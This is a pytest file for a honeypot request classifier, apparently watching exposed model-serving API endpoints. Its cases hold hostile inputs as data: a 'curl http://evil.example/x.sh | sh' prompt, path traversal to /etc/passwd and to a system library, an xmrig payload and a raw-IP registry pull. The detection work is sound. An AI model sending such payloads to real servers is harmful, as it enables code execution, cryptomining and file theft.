import pytest

from honeypot.classify import classify

CASES = [
    (
        "/api/create",
        '{"model":"x","files":{"../../../../usr/lib/ollama/libm.so.6.safetensors":"sha256:aa"}}',
        "safetensors_link_abuse",
    ),
    ("/api/generate", '{"prompt":"curl http://evil.example/x.sh | sh"}', "payload_drop"),
    ("/api/blobs/sha256-deadbeef", "payload=xmrig", "payload_drop"),
    ("/api/blobs/sha256-deadbeef", "../../../../etc/passwd", "path_traversal"),
    ("/api/pull", '{"name":"62.31.247.107:9882/trigger/benign"}', "third_party_registry_pull"),
    ("/api/blobs/sha256-deadbeef", "", "blob_upload"),
    ("/api/chat", '{"model":"llama3"}', "llm_use"),
    ("/v1/chat/completions", "{}", "llm_use"),
    ("/.env", "", "generic_scanner"),
    ("/favicon.ico", "", "other"),
]


@pytest.mark.parametrize("path,body,expected", CASES)
def test_classify(path: str, body: str, expected: str) -> None:
    assert classify(path, body) == expected
